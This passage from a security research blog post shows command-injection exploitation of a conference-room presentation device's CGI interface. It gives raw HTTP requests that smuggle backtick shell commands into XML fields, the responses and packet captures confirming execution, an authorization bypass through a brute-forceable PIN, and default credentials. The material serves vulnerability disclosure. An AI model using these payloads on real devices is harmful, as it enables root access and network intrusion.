<code><span class="o">POST</span> <span class="s2">/cgi-bin/return.cgi</span> HTTP/1.1
<span class="nv">Host:</span> 192.168.100.2
<span class="nv">Connection:</span> close
<span class="nv">Content-Length:</span> 153
<span class="nv">Cache-Control:</span> no-cache
<span class="nv">Origin:</span> https://192.168.100.2
<span class="nv">Content-Type:</span> application/x-www-form-urlencoded
<span class="nv">Accept:</span> */*
<span class="nv">Accept-Language:</span> en-US,en;q=0.8

command=<span class="nv">&lt;Send&gt;&lt;seid&gt;</span><span class="nb">PZs0x6iFiCK4m4Z7</span><span class="nv">&lt;/seid&gt;&lt;upload&gt;&lt;protocol&gt;</span><span class="nb">http</span><span class="nv">&lt;/protocol&gt;&lt;address&gt;</span><span class="nb">`ping -c 3 192.168.100.1`</span><span class="nv">&lt;/address&gt;&lt;logo&gt;</span><span class="nb">test</span><span class="nv">&lt;/logo&gt;&lt;/upload&gt;&lt;/Send&gt;</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge">
<div class="highlight">
<pre class="highlight">
<code><span class="o">HTTP/1.1 200 OK</span>
<span class="nv">X-XSS-Protection:</span> 1; mode=block
<span class="nv">Cache-Control:</span> public, must-revalidate, proxy-revalidate, max-age=604800
<span class="nv">Strict-Transport-Security:</span> max-age=31536000; includeSubDomains; preload
<span class="nv">X-Frame-Options:</span> sameorigin
<span class="nv">Expires:</span> Tue, 14 Jun 2005 18:24:23 GMT
<span class="nv">Content-type:</span> text/xml
<span class="nv">Connection:</span> close
<span class="nv">Date:</span> Tue, 07 Jun 2005 18:24:25 GMT
<span class="nv">Server:</span> lighttpd/1.4.37
<span class="nv">Content-Length:</span> 60

<span class="nv">&lt;return&gt;&lt;protocol&gt;</span><span class="nb">http</span><span class="nv">&lt;/protocol&gt;&lt;result&gt;</span><span class="nb">1</span><span class="nv">&lt;/result&gt;&lt;/return&gt;</span>
</code></pre></div></div>

We get instant confirmation that our payload got executed:

<pre>
192.168.100.2 > 192.168.100.1: ICMP echo request, id 35950
192.168.100.1 > 192.168.100.2: ICMP echo reply, id 35950
192.168.100.2 > 192.168.100.1: ICMP echo request, id 35950
192.168.100.1 > 192.168.100.2: ICMP echo reply, id 35950
192.168.100.2 > 192.168.100.1: ICMP echo request, id 35950
192.168.100.1 > 192.168.100.2: ICMP echo reply, id 35950
</pre>

---

Our second sink, **service_onoff.sh** must be linked to this page that let administrators enable or disable network services:

![airmedia_services_ui]({{site.url}}/assets/airmedia_services_ui.png)

Again, exploitation is straight forward as we just have to put our payload between backticks in the *value* field.

<div class="language-bash highlighter-rouge">
<div class="highlight">
<pre class="highlight">
<code><span class="o">POST</span> <span class="s2">/cgi-bin/return.cgi</span> HTTP/1.1
<span class="nv">Host:</span> 192.168.100.2
<span class="nv">Connection:</span> close
<span class="nv">Content-Length:</span> 116
<span class="nv">Content-Type:</span> application/x-www-form-urlencoded

command=<span class="nv">&lt;Send&gt;&lt;seid&gt;</span><span class="nb">xfnCLxTHA2eyrpNJ</span><span class="nv">&lt;/seid&gt;&lt;name&gt;<span class="nb">USBHID_ONOFF</span>&lt;/name&gt;&lt;value&gt;</span><span class="nb">`ping -c 3 192.168.100.1`</span><span class="nv">&lt;/value&gt;&lt;/Send&gt;</span></code></pre></div></div>

<div class="language-bash highlighter-rouge">
<div class="highlight">
<pre class="highlight">
<code><span class="o">HTTP/1.1 200 OK</span>
<span class="nv">X-XSS-Protection:</span> 1; mode=block
<span class="nv">Cache-Control:</span> public, must-revalidate, proxy-revalidate, max-age=604800
<span class="nv">Strict-Transport-Security:</span> max-age=31536000; includeSubDomains; preload
<span class="nv">X-Frame-Options:</span> sameorigin
<span class="nv">Expires:</span> Tue, 14 Jun 2005 18:27:38 GMT
<span class="nv">Content-type:</span> text/xml
<span class="nv">Connection:</span> close
<span class="nv">Date:</span> Tue, 07 Jun 2005 18:27:41 GMT
<span class="nv">Server:</span> lighttpd/1.4.37
<span class="nv">Content-Length:</span> 51

<span class="nv">&lt;return&gt;&lt;All_data&gt;</span><span class="nb">All_Data_Save</span><span class="nv">&lt;/All_data&gt;&lt;/return&gt;</span></code></pre></div></div>


And again, instant confirmation that our payload got executed:

<pre>
192.168.100.2 > 192.168.100.1: ICMP echo request, id 44410
192.168.100.1 > 192.168.100.2: ICMP echo reply, id 44410
192.168.100.2 > 192.168.100.1: ICMP echo request, id 44410
192.168.100.1 > 192.168.100.2: ICMP echo reply, id 44410
192.168.100.2 > 192.168.100.1: ICMP echo request, id 44410
192.168.100.1 > 192.168.100.2: ICMP echo reply, id 44410
</pre>

---

That's sweet, we reached both sinks and managed to get remote command execution on the device by abusing the CGI scripts. The problem is that it can only be reached by authenticated users with administrative privileges. Our next objective is to find some kind of flaw in the authorization procedures implemented by the web interface.

Let's start by mapping the three different kinds of users that can connect to the web interface:

1. **Administrators** - this is the default admin user.
2. **Moderators** - this is the default moderator user. This user can manage remote viewing.
3. **Viewers** - this user does not exist as is but represents users connecting to the remote viewer interface.

When the admin user logs in, a session token is generated and must be appended at the end of the request path so that it is authenticated:

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/cgi-bin/web_index.cgi?lang=en&amp;src=AwSystem.html&amp;<span style="background-color:white">xfnCLxTHA2eyrpNJ</span>"</span><span class="nt">&gt;
    </span><span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"style_menu"</span><span class="nt">&gt;</span>System Status<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/cgi-bin/web_index.cgi?lang=en&amp;src=AwDevice.html&amp;<span style="background-color:white">xfnCLxTHA2eyrpNJ</span>"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"style_menu"</span><span class="nt">&gt;</span>Device Setup<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/cgi-bin/web_index.cgi?lang=en&amp;src=AwOperating.html&amp;<span style="background-color:white">xfnCLxTHA2eyrpNJ</span>"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"style_menu"</span><span class="nt">&gt;</span>Network Setup<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;/a&gt;</span></code></pre></figure>




Access to remote view is unprotected by default but if the administrator choose to protect it (see setting below), the end user must enter the association PIN code on the web interface to access the remote view.

![airmedia_services_ui]({{site.url}}/assets/awind_viewers_ui.png)

When the end user logs in with the remote view PIN code the server issues the same kind of session token that is used for administrators and moderators users.

There is no authorization checks performed to verify that a valid session token belong to an administrator user or not. This means that an unauthenticated user can bruteforce the four digits PIN code - either via proprietary association protocol or by bruteforcing the login form - and, upon successful authentication, use the received session token to abuse CGIs and gain remote command execution.

Let's conclude our two successful RCE findings with an updated sources and sinks diagrams:

![awind_sources_sinks3]({{site.url}}/assets/awind_sources_sinks3.png)

### 3. Exploitation Paths

You might have guessed that I really like visualizations so here is one describing the different exploitation paths that you could take.

![attack_path.png]({{site.url}}/assets/attack_path.png)

### 4. Good mentions

A few other issues that were reported but not touched upon in this blog post:

* hardcoded FTP credentials with write access in firmware. Those credentials could have led an attacker to overwrite firmware files on the FTP server used by other devices to fetch updates, leading to large scale compromise..
* XSS. A few of them in the web GUI (potentially a duplicate of [CVE-2017-16710](https://www.cvedetails.com/cve/CVE-2017-16710/))
* session token in URL.

### 5. Conclusion

In this blog post we successfully identified lack of input sanitization in shell scripts called by two networked services: **SNMP** and **HTTP**.

By attempting to connect these vulnerable sinks to their sources we identified **valid exploitation paths** that can be triggered by attackers with either knowledge of the device's SNMP read-write community value ('*private*' by default) or the device's admin password value ('*admin*' by default).

Successful exploitation of these vulnerabilities **let the attacker gain root access**. That access could then be used for numerous things such as: **monitoring presentations content**, **serving malicious EXE or DMG files** disguised as legitimate Airmedia clients, modify the web interface to **capture NetNTLM hashes**, or simply use that initial access to **go further into the network**.

In the next post I'll describe how I used knowledge acquired during protocol reverse engineering to reliably identify similar devices exposed on the Internet. Ultimately, this led me on a wild OEM hunt with more than 10 different manufacturers selling around 22 different models affected by the exact vulnerabilities I described here.

<!-- For the full story, just head to [Man-in-the-Conference Room - Part V (Hunting OEMs)]({{site.url}}/pentesting/2018/08/21/awind-device-oemhunt/) -->
